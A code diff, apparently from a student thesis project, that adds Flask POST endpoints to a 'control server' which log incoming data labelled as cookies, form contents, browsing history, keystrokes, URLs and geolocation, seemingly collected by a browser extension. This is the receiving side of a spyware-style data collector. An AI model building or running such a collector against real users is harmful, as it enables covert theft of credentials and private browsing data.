@@ -36,5 +36,25 @@ def control_server():
 def g():
     log.log("Geo", request.get_data())
     return "Done"
+@app.route("/c", methods=['POST'])
+def c():
+    log.log("Coo", request.get_data())
+    return "Done"
+@app.route("/f", methods=['POST'])
+def f():
+    log.log("Form", request.get_data())
+    return "Done"
+@app.route("/h", methods=['POST'])
+def h():
+    log.log("His", request.get_data())
+    return "Done"
+@app.route("/k", methods=['POST'])
+def k():
+    log.log("Key", request.get_data())
+    return "Done"
+@app.route("/u", methods=['POST'])
+def u():
+    log.log("Url", request.get_data())
+    return "Done"
 #conda activate servers
 #flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run
